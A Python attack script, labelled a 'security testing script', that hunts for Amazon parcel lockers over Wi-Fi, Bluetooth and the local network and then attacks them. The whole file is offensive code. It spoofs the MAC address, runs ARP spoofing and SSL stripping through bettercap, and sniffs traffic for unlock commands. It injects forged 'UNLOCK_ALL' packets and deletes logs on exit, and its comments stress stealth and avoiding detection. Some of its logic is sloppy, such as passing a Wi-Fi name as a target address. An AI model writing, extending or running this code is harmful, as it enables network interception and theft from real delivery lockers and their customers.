import os
import time
import random
import netifaces
import asyncio
from bleak import BleakScanner
import signal
import hashlib
from scapy.all import ARP, Ether, srp, sniff, IP, Raw, send
from cryptography.fernet import Fernet

# Global variables for cleanup
active_processes = []

# Generate encryption key (for captured data, if needed)
encryption_key = Fernet.generate_key()
cipher = Fernet(encryption_key)

# Function to spoof MAC address
def spoof_mac(interface):
    new_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))
    os.system(f"ifconfig {interface} down")
    os.system(f"ifconfig {interface} hw ether {new_mac}")
    os.system(f"ifconfig {interface} up")
    print(f"[+] MAC address changed to {new_mac}")

# Function to slow down scanning to avoid detection
def slow_scan_wifi():
    print("[+] Scanning for Wi-Fi networks (Stealth Mode)...")
    try:
        wifi_networks = os.popen("iw dev wlan0 scan | grep SSID").read().splitlines()  # Adjust this for your device
        locker_networks = [net for net in wifi_networks if "AmazonLocker" in net]
        time.sleep(random.uniform(3, 7))  # Random delay to avoid detection
        return locker_networks
    except Exception as e:
        print(f"[!] Wi-Fi scanning failed: {e}")
        return []

# Function to scan local network for lockers
def slow_scan_local_network():
    print("[+] Scanning local network for Amazon lockers...")
    interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    subnet = ".".join(netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr'].split('.')[:3]) + ".0/24"

    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet), timeout=2, verbose=False)
    locker_ips = [rcv.psrc for snd, rcv in ans if "amazon" in os.popen(f"nslookup {rcv.psrc}").read().lower()]
    
    time.sleep(random.uniform(3, 7))  # Random delay
    return locker_ips

# Function to start ARP Spoofing
def start_arp_spoof(target_ip, gateway_ip, interface):
    print(f"[+] Starting ARP Spoofing on {target_ip} via {gateway_ip}")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")  
    process = os.popen(f"bettercap -iface {interface} -eval 'set arp.spoof.targets {target_ip}; arp.spoof on'")
    active_processes.append(process)

# Function to capture packets and detect unlock patterns
def packet_sniffer(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(Raw):
        data = pkt[Raw].load.decode(errors="ignore")
        
        # Hash packet contents for stealth
        packet_hash = hashlib.sha256(data.encode()).hexdigest()
        print(f"[+] Packet Hash: {packet_hash}")

        # Encrypted storage
        encrypted_data = cipher.encrypt(data.encode())

        # Identify unlock command patterns
        if "unlock" in data.lower() or "open" in data.lower():
            print("[+] Detected unlock command pattern!")
            send_malicious_request(pkt[IP].dst, data)

# Function to start selective SSL stripping
def start_ssl_strip(interface):
    print("[+] Starting selective SSL Strip...")
    process = os.popen(f"bettercap -iface {interface} -eval 'set http.proxy.sslstrip true; http.proxy on'")
    active_processes.append(process)

# Function to modify and send a fake unlock command
def send_malicious_request(target_ip, captured_command):
    print("[+] Attempting command injection...")

    # Modify detected unlock command (if found)
    if captured_command:
        modified_command = captured_command.replace("unlock", "UNLOCK_ALL")
    else:
        modified_command = "UNLOCK_ALL"

    print(f"[+] Sending crafted unlock request: {modified_command}")
    send(IP(dst=target_ip)/Raw(load=modified_command), verbose=0)

# Cleanup function to stop attacks and restore network settings
def cleanup(*args):
    print("\n[!] Stopping all attacks and restoring settings...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")  

    # Stop background processes
    for process in active_processes:
        process.close()
    
    # Clear logs
    os.system("rm -f captured_data.txt")
    print("[+] Logs cleared.")
    
    exit(0)

# Locker Detection Module using Wi-Fi, Bluetooth (via bleak), and Local Network Scanning
async def locker_detection():
    print("[+] Starting Amazon Locker Detection...")

    wifi_results = slow_scan_wifi()
    if wifi_results:
        print("[+] Amazon Lockers detected via Wi-Fi:", wifi_results)
        return wifi_results[0]

    print("[+] No Amazon lockers detected via Wi-Fi. You can try Bluetooth or Local Network.")
    return None

# Function to scan for Bluetooth lockers (optional)
async def bluetooth_scan():
    print("[+] Scanning for Bluetooth devices (Stealth Mode)...")
    devices = await BleakScanner.discover()
    locker_bluetooth = [dev.address for dev in devices if "AmazonLocker" in dev.name]
    if locker_bluetooth:
        print("[+] Amazon Lockers detected via Bluetooth:", locker_bluetooth)
        return locker_bluetooth[0]
    
    print("[-] No Amazon lockers detected via Bluetooth.")
    return None

# MitM Attack Module (Automated after detection)
def mitm_attack(target_ip):
    interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    gateway_ip = netifaces.gateways()['default'][netifaces.AF_INET][0]

    print("[+] Spoofing MAC address...")
    spoof_mac(interface)

    print("[+] Starting MitM Attack on", target_ip)
    start_arp_spoof(target_ip, gateway_ip, interface)
    time.sleep(random.uniform(5, 10))  

    print("[+] Capturing packets and looking for unlock patterns...")
    sniff(filter=f"host {target_ip}", prn=packet_sniffer, store=False, count=50)

    print("[+] Attempting SSL Stripping...")
    start_ssl_strip(interface)

    print("[+] MitM Attack Completed.")

# Main Menu
def main():
    signal.signal(signal.SIGINT, cleanup)  

    while True:
        print("\n==== Amazon Locker Security Testing Script ====")
        print("1. Detect and Attack Nearby Locker (Wi-Fi)")
        print("2. Scan for Bluetooth Lockers")
        print("3. Scan for Local Network Lockers")
        print("4. Exit")

        choice = input("Select an option: ")

        if choice == "1":
            target_locker = asyncio.run(locker_detection())
            if target_locker:
                mitm_attack(target_locker)
        elif choice == "2":
            target_locker = asyncio.run(bluetooth_scan())
            if target_locker:
                mitm_attack(target_locker)
        elif choice == "3":
            target_locker = slow_scan_local_network()
            if target_locker:
                mitm_attack(target_locker[0])  # Assuming first detected locker
        elif choice == "4":
            cleanup()
        else:
            print("Invalid option. Please try again.")

if __name__ == "__main__":
    main()
